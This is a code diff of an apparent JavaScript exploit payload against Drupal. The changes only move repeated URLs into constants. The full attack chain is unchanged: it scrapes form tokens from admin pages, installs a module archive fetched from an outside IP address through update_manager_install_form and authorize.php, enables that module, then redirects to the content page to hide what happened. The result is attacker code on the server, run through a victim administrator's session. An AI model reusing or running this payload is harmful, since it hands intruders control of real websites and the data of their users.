@@ -1,9 +1,13 @@
 const exploitURL = "http://192.168.5.15/hello_world.tar.gz";
 const drupalRoot = "";
+const modulesURL = drupalRoot + "/admin/modules";
+const installModuleURL = drupalRoot + "/admin/modules/install";
+const authorizeRequestURL = drupalRoot + "/core/authorize.php/core/authorize.php";
+const dashboardURL = drupalRoot + "/admin/content";
 const req = new XMLHttpRequest();
-req.open("GET", drupalRoot + "/admin/modules", false);
+req.open("GET", modulesURL, false);
 req.send(null);
-req.open("GET", drupalRoot + "/admin/modules/install", false);
+req.open("GET", installModuleURL, false);
 req.send(null);
 const formBuildId = req.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
 const formToken = req.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];
@@ -16,32 +20,32 @@ formData.append("form_build_id", formBuildId);
 formData.append("form_token", formToken);
 formData.append("form_id", "update_manager_install_form");
 formData.append("op", "Continue");
-req.open("POST", drupalRoot + "/admin/modules/install", true);
+req.open("POST", installModuleURL, true);
 req.send(formData);
 req.onreadystatechange = function() {
   if ((req.readyState == XMLHttpRequest.DONE) && (req.responseURL.match("batch="))) {
     const batch = req.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[1];
     const id = req.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[2];
-    req.open("POST", drupalRoot + "/core/authorize.php/core/authorize.php?batch=" + batch + "&id=" + id + "&op=do_nojs&op=do&_format=json", true);
+    req.open("POST", authorizeRequestURL + "?batch=" + batch + "&id=" + id + "&op=do_nojs&op=do&_format=json", true);
     req.send(null);
     req.onreadystatechange = function() {
       if (req.readyState == XMLHttpRequest.DONE) {
-        req.open("GET", drupalRoot + "/core/authorize.php/core/authorize.php?batch=" + batch + "&id=" + id + "&op=do_nojs&op=finished", true);
+        req.open("GET", authorizeRequestURL + "?batch=" + batch + "&id=" + id + "&op=do_nojs&op=finished", true);
         req.send(null);
         req.onreadystatechange = function() {
           if (req.readyState == XMLHttpRequest.DONE) {
             if (req.responseText.match("Files were added successfully")) {
-              req.open("GET", drupalRoot + "/admin/modules", false);
+              req.open("GET", modulesURL, false);
               req.send(null);
               const formBuildId = req.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
               const formToken = req.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];
               const bodyData = "modules%5B" + exploitURL.split("/")[3].split(".")[0] + "%5D%5Benable%5D=1&form_build_id=" + formBuildId + "&form_token=" + formToken + "&form_id=system_modules&op=Install";
-              req.open("POST", drupalRoot + "/admin/modules", true);
+              req.open("POST", modulesURL, true);
               req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
               req.send(bodyData);
               req.onreadystatechange = function() {
                 if (req.readyState == XMLHttpRequest.DONE) {
-                  window.location.replace(drupalRoot + "/admin/content");
+                  window.location.replace(dashboardURL);
                 }
               }
             }
